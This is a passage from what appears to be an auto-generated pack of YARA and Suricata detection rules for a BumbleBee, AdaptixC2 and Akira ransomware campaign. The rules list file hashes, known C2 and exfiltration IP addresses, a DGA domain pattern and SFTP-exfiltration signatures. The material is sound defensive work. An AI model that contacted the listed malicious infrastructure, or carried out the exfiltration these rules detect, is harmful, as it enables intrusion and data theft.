        reference = "https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/"
        hash = "186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da"
        confidence = "high"

    strings:
        $msi_magic = { D0 CF 11 E0 A1 B1 1A E1 }
        $s1 = "consent.exe" ascii wide
        $s2 = "msimg32.dll" ascii wide
        $s3 = "ApplicationInstallationFolder" ascii wide
        $s4 = "ManageEngine" ascii wide nocase

    condition:
        $msi_magic at 0 and $s3 and ($s1 or $s2) and $s4
}
```

### YARA: BumbleBee Loader msimg32.dll
Detects BumbleBee first-stage loader DLL with geofencing API calls and the `hasherezade_pussy` PE-sieve extraction artifact string.
**Status:** compile ✅ compiles (yarac exit 0) · confidence: high
<!-- audit: yarac exit 0. The hasherezade_pussy string is from PE-sieve memory extraction and is highly specific. The API combination of GetSystemDefaultLocaleName + ExitProcess in a DLL named msimg32.dll is behaviorally distinctive. -->
```yara
rule Bumblebee_Loader_msimg32_DLL
{
    meta:
        description = "Detects BumbleBee first-stage loader DLL masquerading as msimg32.dll with dictionary-derived gibberish metadata"
        author = "Actioner"
        date = "2026-07-01"
        reference = "https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/"
        hash_md5 = "ca8646dfc88423bb9fffda811160cebe"
        hash_sha256 = "a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331"
        confidence = "high"

    strings:
        $pe_magic = "MZ"
        $dll_name = "msimg32.dll" ascii wide
        $api1 = "GetSystemDefaultLocaleName" ascii
        $api2 = "ExitProcess" ascii
        $pesieve = "hasherezade_pussy" ascii wide
        $export1 = "vSetDdrawflag" ascii
        $export2 = "GradientFill" ascii

    condition:
        $pe_magic at 0 and $dll_name and (
            $pesieve or
            ($api1 and $api2 and ($export1 or $export2))
        )
}
```

### YARA: Akira Ransomware Locker Binary
Detects Akira ransomware binaries based on ransom note filename, file extension, and ransom message strings.
**Status:** compile ✅ compiles (yarac exit 0) · confidence: medium
<!-- audit: yarac exit 0. Medium confidence because the rule relies on known Akira strings which may evolve across variants. The akira_readme.txt and .akira extension are stable across known variants. -->
```yara
rule Akira_Ransomware_Locker
{
    meta:
        description = "Detects Akira ransomware locker binary based on command-line parameter patterns and behavioral strings"
        author = "Actioner"
        date = "2026-07-01"
        reference = "https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/"
        hash_sha256 = "de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d"
        confidence = "medium"

    strings:
        $pe_magic = "MZ"
        $s1 = "akira_readme.txt" ascii wide nocase
        $s2 = ".akira" ascii wide
        $cmd1 = "-p=" ascii
        $cmd2 = "-n=" ascii
        $ransom1 = "your data are stolen" ascii wide nocase
        $ransom2 = "akiralkzxzq2dsrzsrvbr2xgbbu2wgsmxryd4cez" ascii wide nocase

    condition:
        $pe_magic at 0 and (
            ($s1 and $s2) or
            ($s1 and ($cmd1 or $cmd2)) or
            ($ransom1 or $ransom2)
        )
}
```

### Suricata: AdaptixC2 C2 Beacon to Known Infrastructure
Detects outbound HTTP connections to the known AdaptixC2 C2 server IP `172.96.137[.]160`.
**Status:** ⚠️ uncompiled (structural check only) · confidence: high
<!-- audit: Structural review only; Suricata rule syntax follows standard format with flow, classtype, sid, and rev fields. IOC-based rule with high precision but limited shelf life. -->
```
alert http $HOME_NET any -> 172.96.137.160 any (msg:"ACTIONER AdaptixC2 C2 Beacon to Known Infrastructure"; flow:established,to_server; classtype:trojan-activity; sid:2026070101; rev:1; metadata:created_at 2026_07_01, updated_at 2026_07_01;)
```

### Suricata: BumbleBee C2 TLS Connection to Known IPs
Detects outbound TLS connections to known BumbleBee C2 server IPs on port 443.
**Status:** ⚠️ uncompiled (structural check only) · confidence: high
<!-- audit: Structural review only. IOC-based rule covering 5 known BumbleBee C2 IPs. High precision, limited shelf life as infrastructure rotates. -->
```
alert tls $HOME_NET any -> [188.40.187.145,109.205.195.211,171.22.183.43,194.127.178.21,192.121.22.94] 443 (msg:"ACTIONER BumbleBee C2 TLS Connection to Known Infrastructure"; flow:established,to_server; classtype:trojan-activity; sid:2026070102; rev:1; metadata:created_at 2026_07_01, updated_at 2026_07_01;)
```

### Suricata: SFTP Exfiltration to Known Akira Server
Detects outbound SSH/SFTP connections to the known Akira data exfiltration server at `185[.]174[.]100[.]203`.
**Status:** ⚠️ uncompiled (structural check only) · confidence: high
<!-- audit: Structural review only. IOC-specific with high precision. -->
```
alert ssh $HOME_NET any -> 185.174.100.203 22 (msg:"ACTIONER Akira Exfiltration SFTP Connection to Known Server"; flow:established,to_server; classtype:trojan-activity; sid:2026070103; rev:1; metadata:created_at 2026_07_01, updated_at 2026_07_01;)
```

### Suricata: Reverse SSH Tunnel to Known Exfil Server
Detects outbound SSH connections to the known reverse tunnel endpoint `193[.]242[.]184[.]150`.
**Status:** ⚠️ uncompiled (structural check only) · confidence: high
<!-- audit: Structural review only. IOC-specific. -->
```
alert ssh $HOME_NET any -> 193.242.184.150 22 (msg:"ACTIONER Reverse SSH Tunnel to Known Akira Exfil Server"; flow:established,to_server; classtype:trojan-activity; sid:2026070104; rev:1; metadata:created_at 2026_07_01, updated_at 2026_07_01;)
```

### Suricata: BumbleBee DGA Domain Resolution Pattern
Detects DNS queries matching BumbleBee's Wave 2 DGA pattern of 14-character alphanumeric `.org` domains.
**Status:** ⚠️ uncompiled (structural check only) · confidence: medium
<!-- audit: Structural review only. PCRE pattern may produce false positives on legitimate 14-char .org domains; recommend tuning with allowlist. -->
```
alert dns $HOME_NET any -> any any (msg:"ACTIONER BumbleBee DGA Domain Resolution"; dns.query; content:".org"; endswith; pcre:"/^[a-z0-9]{14}\.org$/"; classtype:trojan-activity; sid:2026070105; rev:1; metadata:created_at 2026_07_01, updated_at 2026_07_01;)
```

### Suricata: FileZilla SSH Banner on Outbound Connection
Detects the `SSH-2.0-FileZilla` client banner in outbound SSH connections, which may indicate SFTP-based data exfiltration.
**Status:** ⚠️ uncompiled (structural check only) · confidence: low
<!-- audit: Structural review only. Low confidence because FileZilla is legitimate software; detection value is contextual (e.g., FileZilla should not be present on servers). -->
```
alert ssh $HOME_NET any -> $EXTERNAL_NET 22 (msg:"ACTIONER FileZilla SSH Client Banner - Potential SFTP Exfiltration"; flow:established,to_server; content:"SSH-2.0-FileZilla"; depth:20; classtype:policy-violation; sid:2026070106; rev:1; metadata:created_at 2026_07_01, updated_at 2026_07_01;)
```

### Suricata: BumbleBee Download Gateway URL Pattern
Detects HTTP requests matching the `/Get?q=` URL pattern used by BumbleBee download gateways to deliver trojanized installers.
**Status:** ⚠️ uncompiled (structural check only) · confidence: medium
<!-- audit: Structural review only. The /Get?q= pattern is a reliable campaign pivot but may match legitimate web applications; recommend combining with domain allowlisting. -->
```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ACTIONER BumbleBee Download Gateway URL Pattern"; flow:established,to_server; http.uri; content:"/Get?q="; startswith; classtype:trojan-activity; sid:2026070107; rev:1; metadata:created_at 2026_07_01, updated_at 2026_07_01;)
```
